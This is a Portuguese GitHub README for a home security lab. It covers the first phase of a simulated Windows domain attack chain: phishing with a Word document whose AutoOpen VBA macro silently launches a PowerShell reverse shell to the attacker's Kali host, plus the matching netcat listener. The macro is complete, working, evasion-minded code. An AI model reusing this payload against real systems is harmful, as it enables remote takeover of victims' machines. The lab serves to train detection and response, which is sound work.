# Simulação de Cadeia de Ataque - Laboratório de Segurança Ofensiva
<br>
<br>

## Objetivo

Esta parte do projeto é a continuação do projeto anterior [Windows Server AD](https://github.com/MercioRodrigues/Windows-server-AD/blob/main/README.md), no qual foi construído, em laboratório, um ambiente Active Directory. Foram também utilizadas ferramentas que já tinham sido preparadas em outro projeto que realizei anteriormente, o [SOC SOAR Project](https://github.com/MercioRodrigues/SOC-SOAR-Project), nomeadamente o **Wazuh**.  
<br>  
Esta fase tem como objetivo simular uma cadeia de ataque realista em um ambiente de domínio Windows, sem detecção por parte do Windows Defender, explorando diferentes etapas de comprometimento típicas de atacantes reais. A simulação foi conduzida em um laboratório controlado, permitindo, posteriormente, a análise detalhada de cada fase da intrusão.


A cadeia de ataque envolve as seguintes etapas:

1. **Acesso inicial**: comprometimento de uma estação de trabalho através da execução de uma macro maliciosa em um documento do Word.
2. **Escalada de privilégios local**: obtenção de privilégios SYSTEM explorando uma tarefa agendada mal configurada.
3. **Exfiltração de credenciais**: extração da memória do processo LSASS para capturar credenciais em texto claro e hashes NTLM.
4. **Movimentação lateral**: acesso ao controlador de domínio (Domain Controller) utilizando técnicas de Pass-the-Hash.

**Análise pós-ataque**: utilização de ferramentas de monitorização e deteção como **Wazuh** e **Wireshark** para investigar a intrusão e compreender os rastros deixados nos logs do sistema e na rede.

O objetivo final é obter não apenas uma shell no controlador de domínio, mas também documentar detalhadamente os indicadores de comprometimento (IoCs), comportamentos suspeitos e evidências forenses que podem ser usadas por equipes de defesa para deteção precoce e resposta a incidentes.

---

⚠️ *Aviso: Este projeto foi realizado exclusivamente para fins educacionais e em ambiente isolado. Nenhuma das técnicas aqui descritas deve ser utilizada em ambientes reais sem autorização explícita.*


<br>
<br>

## 🧪 Fase 1 - Acesso Inicial via Macro em Documento Word (Phishing)

Nesta fase inicial, o atacante utilizou **engenharia social (phishing)** para induzir um colaborador da organização a abrir um documento Word malicioso. O documento continha uma macro em VBA (Visual Basic for Applications) configurada para executar automaticamente ao abrir o ficheiro.

###  Objetivo

Obter uma **shell reversa PowerShell** no sistema da vítima sem levantar suspeitas, utilizando `Wscript.Shell` para evadir políticas de execução e manter a execução em segundo plano.

---

### 📄 Conteúdo da Macro

A macro maliciosa foi inserida no Editor do Visual Basic para Aplicações, dentro do módulo `NewMacros`. O código é dividido em duas partes:

- `AutoOpen()`: executa a macro automaticamente ao abrir o ficheiro
- `test()`: define e executa o payload PowerShell em modo oculto

```vb
Sub AutoOpen()
    Call test
End Sub

Sub test()
    ' test Macro
    Dim objshell As Object
    Set objshell = CreateObject("Wscript.Shell")
    objshell.Run "powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command ""$command = {while($true){try {$cl = New-Object System.Net.Sockets.TcpClient('192.168.1.205',443);$st = $cl.GetStream();$rd = New-Object IO.StreamReader($st);$wr = New-Object IO.StreamWriter($st);$wr.AutoFlush = $true;while($cl.Connected){$cmd = $rd.ReadLine();if($cmd -eq 'exit'){break;}try{$res = iex $cmd 2>&1 | Out-String;}catch{$res = $_.Exception.Message;} $wr.WriteLine($res);$wr.Flush();}$cl.Close();}catch{Start-Sleep -Seconds 10;}}}; Start-Process powershell -WindowStyle Hidden -ArgumentList '-NoProfile', '-ExecutionPolicy', 'Bypass', '-Command', $command"""
    Set objshell = Nothing
End Sub


<p align="center">
 
  <br/>
  <br/>
  <img src="https://github.com/user-attachments/assets/14196c25-96e6-43dc-b1f4-ce14bd0be6be" height="60%" width="60%"/>
    <br/>
    <br/>
  <p/>

---

### Listener do Atacante

Enquanto o documento era aberto pela vítima, o atacante encontrava-se à escuta na máquina Kali, utilizando `netcat` com `rlwrap` para suportar histórico e edição de linha:

```bash
rlwrap nc -lvnp 443

<br/>
  <br/>
  <img src="https://github.com/user-attachments/assets/1d6fd6d7-a226-44c2-a28a-da105117975d" height="60%" width="60%"/>
    <br/>
    <br/>
  <p/>

**Resumo**

O código PowerShell embutido na macro estabelece uma conexão TCP reversa para o endereço do atacante (192.168.1.205) na porta 443. Após a conexão, o script entra num loop que:

1. Recebe comandos enviados pelo atacante

2. Executa os comandos localmente com Invoke-Expression (iex)

3. Envia a saída da execução de volta através do canal TCP

Este tipo de técnica é comum em ataques fileless, pois evita gravações em disco e contorna políticas de execução do PowerShell.

